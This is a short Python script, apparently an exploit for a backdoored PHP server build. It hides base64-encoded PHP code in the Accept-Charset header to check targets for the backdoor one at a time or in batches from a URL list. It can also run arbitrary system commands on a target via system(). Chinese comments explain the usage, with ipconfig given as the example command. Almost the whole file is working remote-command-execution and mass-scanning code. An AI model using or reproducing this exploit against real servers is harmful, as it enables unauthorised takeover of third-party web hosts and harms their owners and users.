import requests
import sys
import base64


def check_phpinfo(url):
    print(url)
    payload = base64.b64encode("echo phpinfo();".encode('utf-8'))
    headers = {
        "accept-charset": f"{str(payload, 'utf-8')}",
        "Accept-Encoding": "gzip,deflate",
    }
    try:
        r = requests.get(url, headers=headers)
        if r.status_code == 200 and "phpinfo" in r.text:
            print(f"BackDoor:Server= {r.headers.get('Server')}")
        else:
            print("No BackDoor Exit!")
    except:
        print('bug')

def batch(txt):
    with open(f'{txt}', 'r', encoding='utf-8') as f:
        for u in f:
            if 'http' not in u and 'https' not in u:
                u = 'http://' + u
            u=u.replace('\n',' ')
            check_phpinfo(u)

def execute(url, cmd):
    payload = base64.b64encode(f"system('{cmd}');".encode('utf-8'))
    headers = {
        "accept-charset": f"{str(payload, 'utf-8')}",
        "Accept-Encoding": "gzip,deflate",
    }
    r1 = requests.get(url, headers=headers)
    print(r1.text)





if __name__ == '__main__':
    input = sys.argv[:]
    url = input[1]
    if 'http' not in url and 'https' not in url:
        url = 'http://' + url

    if len(input)==2 and 'txt' in input[1]:
        txt=input[1]
        batch(txt)
    else:
        check_phpinfo(url)

    if len(input)>2:
        cmd=input[2:]
        cmd=' '.join(cmd)
        execute(url,cmd)

# python test.py 127.0.0.1 手工输入地址检测
# python test.py 1.txt 批量检测txt里面的地址
# python test.py 127.0.0.1 ipconfig